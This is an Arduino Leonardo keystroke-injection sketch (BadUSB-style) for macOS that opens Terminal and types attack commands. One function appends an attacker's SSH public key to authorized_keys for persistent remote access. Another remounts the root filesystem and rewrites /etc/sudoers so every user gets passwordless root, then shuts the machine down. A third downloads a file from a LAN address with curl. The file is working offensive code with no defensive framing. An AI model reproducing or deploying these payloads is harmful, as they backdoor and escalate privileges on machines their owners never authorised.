#include <phukdlib_leonardo.h>
  
  void PasswordlessSSH() {
  delay(3000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  delay(100);
  Keyboard.releaseAll();
  delay(1500);
  Keyboard.print("terminal");
  delay(1000);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.println("echo 'RSA_PUB_ID' >> ~/.ssh/authorized_keys");
  delay(4000);
  Keyboard.println("killall Terminal");
}

void EasySudo(){
  delay(3000);
  CommandAtRunBarOSX("terminal");
  delay(3000);
  Keyboard.println("mount -uw / && chmod 755 /etc/sudoers && echo 'ALL    ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers && chmod 440 /etc/sudoers && shutdown -h now");
  delay(3000);
  while(1);  
}

void Command(){
  delay(5000);
  CommandAtRunBarOSX("terminal");
  delay(3000);
  Keyboard.println("curl http://192.168.1.210 > virus.txt");
  delay(2000);
  Keyboard.println("less virus.txt");
  while(1);
}
